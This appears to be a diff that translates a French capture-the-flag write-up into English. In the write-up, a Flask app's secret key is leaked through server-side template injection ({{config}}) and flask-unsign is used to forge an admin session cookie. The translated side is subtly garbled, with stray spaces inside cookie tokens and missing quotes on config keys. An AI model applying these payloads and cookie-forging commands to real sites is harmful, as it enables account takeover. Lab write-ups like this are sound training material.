@@ -4,65 +4,65 @@
 
 ### Not So Secret
 
-**Difficulté :** Moyen
+**Difficulty:** Medium
 
-**Enoncé :** Je suis en train de créer la prochaine grande plateforme de réseaux sociaux, mais j'ai l'habitude de mettre en place des logiciels non sécurisés.
+**Statement:** I am creating the next big social networking platform, but I have a history of setting up unsecured software.
 
-Si vous pouvez vous connecter à l'utilisateur administrateur, je vous donnerai le flag.
+If you can log in to the admin user, I will give you the flag.
 
-Quelqu'un a piraté mon site après que j'ai lu son message, donc je ne lis plus les DM qui me sont envoyés ! > :( 
+Someone hacked my site after I read his message, so I don't read the DMs sent to me anymore! > :( 
 
-En plus de cela, j'impose un filtre de caractères spéciaux encore plus sévère parce que je ne sais pas vraiment comment patcher mon code.
+On top of that, I'm imposing an even stricter special character filter because I don't really know how to patch my code.
 
-p.s. Pour vous faire gagner du temps, n'essayez pas d'obtenir un reverse shell
+p.s. To save you time, don't try to get a reverse shell
 
 ***
 
-En se connectant au site, on peut apercevoir que le cookie de session est un cookie Flask :
+When logging into the site, you can see that the session cookie is a Flask cookie:
 
 ```
-.eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q
+.eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q
 ```
 
-Je commence par décoder le cookie avec **flask-unsign** :
+I start by decoding the cookie with **flask-unsign** :
 
 ```
-flask-unsign --decode --cookie 'eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q'
+flask-unsign --decode --cookie 'eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF- TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q'
 ```
 
-Valeur du cookie :
+Cookie value:
 
-```
+```py
 {'_fresh': True, '_id': 'ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827', '_user_id': '2'}
 ```
 
-On peut constater que la valeur `'_user_id'` est à 2.
-Il est fort probable que la valeur 1 soit le compte administrateur.
+We can see that the value `'_user_id'` is 2.
+It is very likely that the value 1 is the administrator account.
 
-J'essaye par la suite de bruteforce le cookie par attaque de dictionnaire mais non-concluant :
+I then try to brute force the cookie by dictionary attack but not conclusively:
 
 ```
-flask-unsign --unsign --cookie ".eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY.YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q" --wordlist ~/rockyou.txt --no-lit
+flask-unsign --unsign --cookie ". eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q" --wordlist ~/rockyou.txt --no-lit
 eral-eval
 ```
 
-Il nous manque la clé pour signer notre cookie Flask, je décide donc de regarder côté serveur web pour récupérer cette valeur.
+We are missing the key to sign our Flask cookie, so I decide to look at the web server side to get this value.
 
-Sur la page d'envois de message, je remarque qu'une faille SSTI (Server Side Template Injection) est exploitable grâce à un simple payload : `{{7*'7'}}`
+On the message sending page, I notice that a SSTI (Server Side Template Injection) flaw is exploitable thanks to a simple payload: `{{7*'7'}}`
 
 ![image](https://user-images.githubusercontent.com/49941629/166097821-b3fa5a63-abac-40f1-bfe5-00b2e5cae5ab.png)
 
-Je vais donc essayer de récupérer la configuration serveur en injectant le payload `{{config}}` :
+So I'll try to recover the server configuration by injecting the payload `{{config}}` :
 
 ```
 Just sent your message: <Config {'ENV': 'production',
-'DEBUG': False,
+DEBUG': False,
 'TESTING': False,
-'PROPAGATE_EXCEPTIONS': None, 
-'PRESERVE_CONTEXT_ON_EXCEPTION': None, 
-'SECRET_KEY': 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd', 
+PROPAGATE_EXCEPTIONS': None, 
+PRESERVE_CONTEXT_ON_EXCEPTION': None, 
+SECRET_KEY': 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd', 
 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 
-'USE_X_SENDFILE': False, 
+USE_X_SENDFILE': False, 
 'SERVER_NAME': None, 
 'APPLICATION_ROOT': '/', 
 'SESSION_COOKIE_NAME': 'session', 
@@ -74,9 +74,9 @@ Just sent your message: <Config {'ENV': 'production',
 'SESSION_REFRESH_EACH_REQUEST': True, 
 'MAX_CONTENT_LENGTH': None, 
 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 
-'TRAP_BAD_REQUEST_ERRORS': None, 
-'TRAP_HTTP_EXCEPTIONS': False, 
-'EXPLAIN_TEMPLATE_LOADING': False, 
+TRAP_BAD_REQUEST_ERRORS': None, 
+TRAP_HTTP_EXCEPTIONS': False, 
+EXPLAIN_TEMPLATE_LOADING': False, 
 'PREFERRED_URL_SCHEME': 'http', 
 'JSON_AS_ASCII': True, 
 'JSON_SORT_KEYS': True, 
@@ -99,7 +99,7 @@ Just sent your message: <Config {'ENV': 'production',
 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
 ```
 
-Je récupère la valeur de la clé : `'SECRET_KEY': 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd'` et je modifie le cookie afin de le faire correspondre au compte admin :
+I get the value of the key: `'SECRET_KEY': 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd'` and change the cookie to match the admin account :
 
 ```
 flask-unsign --sign --cookie "{'_fresh': True, '_id': 'ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827', '_user_id': '1'}" --secret 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd'
@@ -107,8 +107,7 @@ flask-unsign --sign --cookie "{'_fresh': True, '_id': 'ce350b99da512575db31f0955
 
 ![image](https://user-images.githubusercontent.com/49941629/166097953-0f4dcb33-87fe-4fc6-bf3f-efcbc8217dd3.png)
 
-Il ne me reste plus qu'à m'authentifier avec le cookie admin et récupérer le flag.
+Now I just have to authenticate with the admin cookie and get the flag.
 
-FLAG : PCTF{y0u_can_s1gn_my_c00k13s_anyt1m3_;)}
-
+Flag: PCTF{y0u_can_s1gn_my_c00k13s_anyt1m3_;)}
 
